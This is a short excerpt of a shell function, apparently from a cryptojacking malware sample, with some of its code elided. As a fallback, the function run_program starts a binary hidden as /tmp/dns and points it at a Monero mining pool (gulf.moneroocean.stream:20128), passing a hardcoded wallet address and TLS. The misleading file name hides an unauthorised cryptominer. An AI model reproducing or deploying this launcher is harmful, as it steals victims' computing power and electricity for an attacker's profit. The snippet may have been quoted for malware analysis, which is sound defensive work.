...
run_program() {
    ...
    fallback && [ -x /tmp/dns ] && launch /tmp/dns -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls
}
